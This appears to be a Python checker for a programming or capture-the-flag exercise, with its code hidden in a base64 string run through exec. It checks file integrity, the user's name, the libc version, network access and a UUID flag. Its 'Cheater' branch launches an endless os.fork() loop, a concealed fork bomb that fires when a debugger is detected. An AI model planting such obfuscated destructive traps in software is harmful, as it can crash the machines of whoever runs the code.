#!/usr/bin/env python3

import sys
import os
import re
import getpass
import subprocess
import socket
import hashlib
import uuid
import base64

MD5 = '42581183e3e7c6863ec812cb770e1b6f'

exec(base64.b64decode('ZGVmIGNoZWNrMCgpOgogICAgd2l0aCBvcGVuKHN5cy5hcmd2WzBdLCAncicpIGFzIGZpOgogICAgICAgIGRhdGEgPSBmaS5yZWFkbGluZXMoKVsxNDpdCiAgICAgICAgCiAgICAgICAgdGV4dCA9ICcnLmpvaW4oZGF0YSkKCiAgICAgICAgaCA9IGhhc2hsaWIubWQ1KCkKICAgICAgICBoLnVwZGF0ZSh0ZXh0LmVuY29kZSgpKQoKICAgICAgICBpZiBub3QgaC5oZXhkaWdlc3QoKSA9PSBNRDU6CiAgICAgICAgICAgIHByaW50KCdZb3UgY2Fubm90IG1vZGlmeSB0aGUgZmlsZScpCiAgICAgICAgICAgIHN5cy5leGl0KC02KQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCdDaGVjayAwIHBhc3NlZCcpCgpkZWYgY2hlY2sxKG5hbWUpOiAgICAKICAgIGlmIG5hbWUgYW5kIGxlbihuYW1lKSA+IDQ6CiAgICAgICAgbmFtZSA9IG5hbWUuc3RyaXAoKS51cHBlcigpCiAgICBlbHNlOgogICAgICAgIHByaW50KCdJbmNvcnJlY3QgbmFtZScpCiAgICAgICAgc3lzLmV4aXQoLTEpCiAgICBwcmludCgnQ2hlY2sgMSBwYXNzZWQnKSAgICAgICAgICAgIAoKZGVmIGNoZWNrMihuYW1lKToKICAgIGlmIG5vdCAobmFtZSBpbiBvcy5wYXRoLmFic3BhdGgoc3lzLmFyZ3ZbMF0pLnVwcGVyKCkpOgogICAgICAgIHByaW50KCdJbmNvcnJlY3QgbmFtZScpCiAgICAgICAgc3lzLmV4aXQoLTIpCiAgICBwcmludCgnQ2hlY2sgMiBwYXNzZWQnKSAgICAgICAgICAgIAoKZGVmIGNoZWNrdmVyKHB0aCk6CiAgICBjaGsgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChbc3lzLmV4ZWN1dGFibGUsIHB0aF0sIGVuY29kaW5nPSdVVEYtOCcpCgogICAgdiA9IHJlLmZpbmRhbGwoJ1xkXC5cZFxkJywgY2hrLnNwbGl0KCdcbicpWzBdLnN0cmlwKCkpWzBdCiAgICByZXR1cm4gdiA9PSAnMi4yNCcKCmRlZiBjaGVjazMoKToKICAgIGdldHRyYWNlID0gZ2V0YXR0cihzeXMsICdnZXR0cmFjZScsIE5vbmUpCiAgICBpZiBnZXR0cmFjZSBhbmQgZ2V0dHJhY2UoKSBvciBvcy5nZXRlbnYoJ0FVU0VSJywgJycpOgogICAgICAgIHByaW50KCdDaGVhdGVyJykKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBvcy5mb3JrKCkKICAgIHByaW50KCdDaGVjayAzIHBhc3NlZCcpCgpkZWYgY2hlY2s0KCk6CiAgICBwID0gc3lzLmV4ZWN1dGFibGUKCiAgICBjaGsgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChbcCwgJ2xkZC5weSddLCBlbmNvZGluZz0nVVRGLTgnKQoKICAgIGZvciBwbGluZSBpbiBjaGsuc3BsaXQoJ1xuJyk6CiAgICAgICAgaWYgJ2xpYmMuc28uNicgaW4gcGxpbmU6CiAgICAgICAgICAgIGxpbmUgPSBwbGluZS5zdHJpcCgpLnNwbGl0KCcgJylbMl0KICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIG5vdCBjaGVja3ZlcihsaW5lKToKICAgICAgICAgICAgICAgIHByaW50KCdJbmNvcnJlY3Qgc3lzdGVtIHZlcnNpb24nKQogICAgICAgICAgICAgICAgc3lzLmV4aXQoLTQpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludCgnQ2hlY2sgNCBwYXNzZWQnKQogICAgICAgICAgICAgICAgcmV0dXJuCgogICAgcHJpbnQoJ0luY29ycmVjdCBzeXN0ZW0gdmVyc2lvbicpCiAgICBzeXMuZXhpdCgtNCkKCmRlZiBjaGVjazUoKToKICAgIHRyeToKICAgICAgICBzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoMSkKICAgICAgICBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pLmNvbm5lY3QoKCd5YS5ydScsIDgwKSkKICAgICAgICBwcmludCgnQ2hlY2sgNSBwYXNzZWQnKQoKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBleDoKICAgICAgICBwcmludCgnSW5jb3JyZWN0IGluZXQgc2V0dGluZ3MnKQogICAgICAgIHN5cy5leGl0KC01KQoKZGVmIGNoZWNrNihuYW1lKToKICAgIGltcG9ydCBod19tb2R1bGUKCiAgICBpZiBod19tb2R1bGUuZG9fd29yaygpID4gMDoKICAgICAgICB3aXRoIG9wZW4oJ2ZsYWcudHh0JywgJ3InKSBhcyBmaToKICAgICAgICAgICAgZGF0YSA9IGZpLnJlYWQoKS5zdHJpcCgnXHgwMCcpCgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB1dWlkX29iaiA9IHV1aWQuVVVJRChkYXRhLCB2ZXJzaW9uPTQpCgogICAgICAgICAgICAgICAgcHJpbnQoZidZb3UgcGFzc2VkIGNoZWNrNiA6IHtuYW1lfS17ZGF0YX0nKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICAgICAgICAgIHBhc3MKCiAgICBwcmludCgnWW91IGRpZG5cJ3QgY29tcGxldGUgNiB0YXNrJykKICAgIHN5cy5leGl0KC02KQoKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBjaGVjazAoKQogICAgX25hbWUgPSBpbnB1dCgnRW50ZXIgeW91ciBuYW1lOlxuPiAnKS51cHBlcigpCiAgICBjaGVjazEoX25hbWUpCiAgICBjaGVjazIoX25hbWUpCiAgICBjaGVjazMoKQogICAgY2hlY2s0KCkKICAgIGNoZWNrNSgpCiAgICBjaGVjazYoX25hbWUp'))
